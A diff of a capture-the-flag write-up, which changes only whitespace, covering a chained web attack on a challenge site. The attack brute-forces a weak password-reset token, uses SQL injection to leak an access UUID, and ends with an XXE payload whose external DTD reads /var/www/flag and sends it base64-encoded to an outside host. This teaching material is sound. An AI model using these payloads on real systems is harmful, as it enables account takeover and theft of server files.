@@ -18,27 +18,27 @@ The challenge provided us with the source code of the webpage.
 
 ### Approach
 
-Looking at the source code, the only weird thing we managed to find was that when you reset an user's password, they get emailed a token to change the password. When changing it, only the first 4 characters of the token are checked. Might be bruteforcable heh.
-The token is calculated so:
+Looking at the source code, the only weird thing we managed to find was that when you reset an user's password, they get emailed a token to change the password. When changing it, only the first 4 characters of the token are checked. Might be bruteforcable heh.  
+The token is calculated so:  
 ```php
 $uname = mysqli_real_escape_string($mysqli, $_POST['uname']);
 $s = system("date +%s%3N > /tmp/time");
 $time = file_get_contents("/tmp/time");
 $fullToken = md5( $unam . $time . "SECRET" );
 ```
-Hmm, is the misspelled `$uname` the typo? We know it anyways? Weird.
-Anyways we can measure the time our request to the server takes and predict the timestamp. Writing it to a file and reading it back adds a newline though!
+Hmm, is the misspelled `$uname` the typo? We know it anyways? Weird.  
+Anyways we can measure the time our request to the server takes and predict the timestamp. Writing it to a file and reading it back adds a newline though!  
 
-What should we do next? Change the password!
-From the `robots.txt` file we know, that:
+What should we do next? Change the password!  
+From the `robots.txt` file we know, that:  
 ```
 # Default username is 'admin' and ID is 1 if you didn't change it
 /var/www/flag
 ```
 
-To change the password we need to provide an ID, a token and the new password.
-We can just keep sending password change requests until we see `Password changed` in the response. It's like 200 requests so not that bad.
-Once logged in we have access to `data.php` which allows us to craft a sql injection. That's the only sql read, that doesn't sanitize the input.
+To change the password we need to provide an ID, a token and the new password.  
+We can just keep sending password change requests until we see `Password changed` in the response. It's like 200 requests so not that bad.  
+Once logged in we have access to `data.php` which allows us to craft a sql injection. That's the only sql read, that doesn't sanitize the input.  
 
 ```php
 $uname = $_GET['u'];
@@ -53,12 +53,12 @@ if( $result = $mysqli->query($sql) ){
 }
 ```
 
-We see, that `read.php` could have a XXE, cause it loads a XML file to check if an user exists? lol
-Let's leak the UUID that's needed to get access to `read.php` with a sql injection.
+We see, that `read.php` could have a XXE, cause it loads a XML file to check if an user exists? lol  
+Let's leak the UUID that's needed to get access to `read.php` with a sql injection.  
 
-### Solution
-Using all of that described before. It's time to come up with a multi-part exploit.
-Let's reset and change the password with a small python script:
+### Solution  
+Using all of that described before. It's time to come up with a multi-part exploit.  
+Let's reset and change the password with a small python script:  
 
 ```python
 import time
@@ -195,18 +195,17 @@ if __name__ == '__main__':
 
 With the admin password changed we can log on in the browser using username admin and password nestingdoll.
 
-My teammate was able to leak the UUID needed to exploit the XML files. I'm not sure what the correct SQL injection was, but the UUID was `8d6ed261-f84f-4eda-b2d2-16332bd8c390`
-Next from the developer console using a small javascript code I was able to send custom XML files to `read.php`
-In the end the working XXE hosted a external DTD which sent us the flag.
-Used XXE:
-`<\?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY % xxe SYSTEM "https://get.station307.com/OwKvYH1R6Mt/test.dtd"> %xxe; %ent; %send;]><user><username>admin</username></user>`
-Used DTD:
-`<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/flag"><!ENTITY % ent "<!ENTITY &#x25; send SYSTEM 'https://nestingdoll.free.beeceptor.com/?%data;'>">`
+My teammate was able to leak the UUID needed to exploit the XML files. I'm not sure what the correct SQL injection was, but the UUID was `8d6ed261-f84f-4eda-b2d2-16332bd8c390`  
+Next from the developer console using a small javascript code I was able to send custom XML files to `read.php`  
+In the end the working XXE hosted a external DTD which sent us the flag.  
+Used XXE:  
+`<\?xml version="1.0" encoding="UTF-8"?><!DOCTYPE replace [<!ENTITY % xxe SYSTEM "https://get.station307.com/OwKvYH1R6Mt/test.dtd"> %xxe; %ent; %send;]><user><username>admin</username></user>`  
+Used DTD:  
+`<!ENTITY % data SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/flag"><!ENTITY % ent "<!ENTITY &#x25; send SYSTEM 'https://nestingdoll.free.beeceptor.com/?%data;'>">`  
 
-As PHP doesn't support newlines in an url, we need to convert the contents of flag to base64. With multiple failed attemps I finally got a request to my beeceptor link with the base64 contents.
-Decoding the base64 gives us the flag.
-Flag:
-
+As PHP doesn't support newlines in an url, we need to convert the contents of flag to base64. With multiple failed attemps I finally got a request to my beeceptor link with the base64 contents.  
+Decoding the base64 gives us the flag.  
+Flag:  
 ```
 I wish fllllaggggg was spelllllled with multple gggg and lllll
 SSD{19e01769f56207cb4620173f9aa8789ba5b9e71a}
